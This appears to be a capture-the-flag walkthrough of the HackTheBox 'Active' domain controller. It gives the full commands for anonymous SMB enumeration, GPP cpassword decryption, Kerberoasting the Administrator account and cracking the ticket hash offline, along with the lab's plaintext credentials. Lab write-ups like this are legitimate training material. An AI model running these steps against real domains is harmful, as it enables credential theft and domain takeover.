---
title: "HTB - Active (Easy | Windows | Active Directory)"
date: 2026-09-27 12:00:00 +0000
categories: [HackTheBox, Active Directory]
tags: [htb, windows, active-directory, gpp, gpp-decrypt, smb, smbclient, getuserspns, kerberoasting, john, cpassword, netexec, nxc]
description: "Anonymous SMB read on the Replication share leaks a GPP cpassword (MS14-025); decrypt it for a service account, then Kerberoast the Administrator SPN and crack it with John for Domain Admin"
image:
  path: /assets/img/active.png
---

## **Recon**

```bash
nmap -p- -sSCV --open --min-rate 5000 <target>
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-29 20:26:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
|_clock-skew: -1s
| smb2-time: 
|   date: 2026-09-29T20:27:26
|_  start_date: 2026-09-29T20:24:02
```

### Service Discovery Analysis

The Nmap scan reveals a classic Active Directory environment running on an older operating system:

- **DNS (Port 53):** Microsoft DNS 6.1.7601 — confirms **Windows Server 2008 R2 SP1**, a significantly outdated OS
- **Kerberos (Port 88):** Confirms Active Directory environment
- **RPC (Port 135, 593, 5722):** Multiple Windows RPC endpoints
- **SMB (Port 139, 445):** Microsoft Windows file sharing — message signing required
- **LDAP (Port 389, 636, 3268, 3269):** Active Directory LDAP services
- **kpasswd (Port 464):** Kerberos password change service
- **.NET Message Framing (Port 9389):** AD Web Services
- **RPC (Multiple high ports):** Various Windows RPC endpoints

**Domain:** active.htb **Hostname:** DC **OS:** Windows Server 2008 R2 SP1

The most critical finding here is **Windows Server 2008 R2** — this is an end-of-life operating system notorious for legacy misconfigurations. The absence of WinRM and HTTP means the attack path runs entirely through **SMB and Kerberos**. Windows Server 2008 R2 domains commonly suffer from **Group Policy Preferences (GPP) credential exposure** — a vulnerability that Microsoft patched in 2014 but remains present on older or unpatched environments.

We add the domain to `/etc/hosts`:

```bash
echo "<target> active.htb" | sudo tee -a /etc/hosts
```

---

## **User**

### SMB Anonymous Enumeration

We start by enumerating SMB shares without credentials. Using netexec with empty username and password (`-u '' -p ''`) tests for null session access — a legacy Windows feature that allows unauthenticated enumeration:

```bash
nxc smb active.htb -u '' -p '' --shares
```

![](/assets/img/active/Pasted_image_20260929173346.png)

The **Replication** share is accessible anonymously with READ permission. This share name is significant — in older Active Directory environments, the `Replication` share sometimes mirrors the `SYSVOL` share, which contains Group Policy files distributed to all domain computers.

### SMB Share Access - Replication

We connect to the Replication share using smbclient with a null session (`-N` for no password):

```bash
smbclient -N //<target>/Replication
```

![](/assets/img/active/Pasted_image_20260929174947.png)

Exploring the share reveals a familiar directory structure — specifically a folder named `{31B2F340-016D-11D2-945F-00C04FB984F9}`, which is the well-known GUID for the **Default Domain Policy** Group Policy Object. The `scripts` subfolder contains interesting files.

We enable recursive listing and disable interactive prompts, then download all files from the policy folder:

```bash
recurse ON
prompt OFF
cd {31B2F340-016D-11D2-945F-00C04FB984F9}
mget *
```

With all files downloaded locally, we search recursively for any password strings across all files. The `-r` flag searches recursively, `-n` shows line numbers, `-E` uses extended regex, and `-I` ignores binary files:

```bash
grep -rnEI "password.*" .
```

![](/assets/img/active/Pasted_image_20260929175033.png)

A `Groups.xml` file contains a `cpassword` field and a username `SVC_TGS`.

### Overview - GPP Credentials (MS14-025 / CVE-2014-1812)

**What are Group Policy Preferences (GPP)?** GPP is a Windows feature that allows administrators to configure settings across domain computers via Group Policy — including creating local users, mapping drives, and setting scheduled tasks. Administrators could embed credentials directly in GPP XML files, which were stored in the SYSVOL share and replicated to every domain computer.

**What is the vulnerability?** Microsoft used AES-256 to encrypt these embedded passwords (`cpassword` field), but critically, they **published the AES encryption key** in their MSDN documentation. This means anyone who can read the GPP XML files can decrypt every password stored in them — domain users have read access to SYSVOL by default, and unauthenticated access (as seen here) makes it even worse.

**Microsoft's fix:** MS14-025 (2014) prevented new GPP passwords from being created, but it did **not** remove existing ones. Any GPP XML file created before the patch still contains decryptable passwords.

**Why does this still work?** This DC runs Windows Server 2008 R2 — predating or missing the patch. The `Groups.xml` file in the replicated SYSVOL contains a legacy GPP credential for `SVC_TGS`.

### Decrypting the GPP cpassword

We use `gpp-decrypt` — a tool that implements the published AES-256 key to decrypt GPP cpassword values. The tool takes the base64-encoded encrypted password and returns the plaintext:

```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

```
GPPstillStandingStrong2k18
```

**Credentials obtained:** `SVC_TGS:GPPstillStandingStrong2k18`

### Credential Validation

We verify the credentials work against SMB and check accessible shares:

```bash
nxc smb active.htb -u "SVC_TGS" -p "GPPstillStandingStrong2k18" --shares
```

![](/assets/img/active/Pasted_image_20260929175419.png)

The credentials are valid and we now have READ access to the **Users** share — which maps to `C:\Users` on the domain controller.

### Retrieving User Flag

We connect to the Users share as SVC_TGS and retrieve the user flag:

```bash
smbclient //<target>/Users -U 'SVC_TGS'
```

![](/assets/img/active/Pasted_image_20260929181734.png)

The user flag is retrieved from SVC_TGS's desktop directory.

---

## **Root**

### Overview - Kerberoasting

**What is Kerberoasting?** Kerberoasting is an Active Directory attack that targets service accounts. In Kerberos, any authenticated domain user can request a **Service Ticket (TGS)** for any account that has a Service Principal Name (SPN) registered. The TGS is encrypted with the service account's password hash — meaning we can request one and attempt to crack the password offline.

**Why is the Administrator account vulnerable here?** In some AD configurations, the built-in Administrator account has an SPN registered — making it Kerberoastable. This is a significant misconfiguration because the Administrator is the highest-privileged account in the domain. Successfully cracking its TGS hash gives direct domain admin access.

**What makes this particularly impactful?** Unlike regular Kerberoasting against service accounts, cracking the Administrator's TGS hash means instant full domain compromise — no lateral movement required.

### Kerberoasting - SPN Enumeration

We use `impacket-GetUserSPNs` to identify accounts with SPNs registered. The `faketime` wrapper synchronizes our clock with the DC to avoid Kerberos time-skew errors:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-GetUserSPNs -dc-ip <target> 'active.htb/SVC_TGS:GPPstillStandingStrong2k18'
```

![](/assets/img/active/Pasted_image_20260929182012.png)

The **Administrator** account has an SPN registered — making it directly Kerberoastable.

### Requesting the Kerberos TGS Ticket

We request the TGS ticket for Administrator and save the hash to a file for offline cracking. The `-request-user` flag targets a specific account and `-outputfile` saves the extracted hash:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip <target> -request-user Administrator -outputfile hashes.kerberoast
```

![](/assets/img/active/Pasted_image_20260929182103.png)

The TGS ticket hash for Administrator is extracted and saved.

### Cracking the Kerberos Hash

We use John the Ripper to crack the TGS hash against the rockyou.txt wordlist:

```bash
john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt
```

![](/assets/img/active/Pasted_image_20260929182125.png)

**Administrator password cracked:** `Ticketmaster1968`

### Credential Validation

We verify the Administrator credentials with netexec:

```bash
nxc smb active.htb -u 'Administrator' -p 'Ticketmaster1968'
```

![](/assets/img/active/Pasted_image_20260929182254.png)

The output shows `Pwn3d!` — confirming full domain administrator access.

### Retrieving Root Flag

Since WinRM is not available on this machine, we access the Administrator's desktop directly via SMB. We connect to the Users share as Administrator:

```bash
smbclient //<target>/Users -U 'Administrator'
```

![](/assets/img/active/Pasted_image_20260929182501.png)

The root flag is retrieved from the Administrator's desktop directory, completing the full domain compromise.

---

### Attack Chain Summary

1. **Reconnaissance:** Nmap identified a Windows Server 2008 R2 SP1 Domain Controller — an end-of-life OS notorious for legacy misconfigurations; standard Active Directory ports visible with no WinRM or HTTP
2. **SMB Null Session:** Enumerated SMB shares anonymously using netexec; discovered the **Replication** share accessible without credentials
3. **SYSVOL Replication Access:** Connected to the Replication share via smbclient; identified Default Domain Policy GPO directory structure (`{31B2F340...}`)
4. **GPP Credential Discovery:** Downloaded all files from the GPO directory; used `grep` to find `cpassword` field in `Groups.xml` for user `SVC_TGS`
5. **GPP Decryption (MS14-025):** Used `gpp-decrypt` with the publicly known AES-256 key to decrypt the cpassword, obtaining `SVC_TGS:GPPstillStandingStrong2k18`
6. **Credential Validation:** Verified SVC_TGS credentials against SMB; confirmed READ access to Users share
7. **User Flag:** Retrieved user.txt from SVC_TGS's desktop via SMB
8. **Kerberoasting Enumeration:** Used `impacket-GetUserSPNs` to discover that the Administrator account has an SPN registered — making it Kerberoastable
9. **TGS Hash Extraction:** Requested and captured the Administrator's Kerberos TGS ticket hash using GetUserSPNs with `-request-user`
10. **Hash Cracking:** Cracked the Administrator TGS hash with John the Ripper and rockyou.txt, obtaining `Ticketmaster1968`
11. **Full Domain Compromise:** Validated Administrator credentials via netexec (Pwn3d!); retrieved root flag from Administrator's desktop via SMB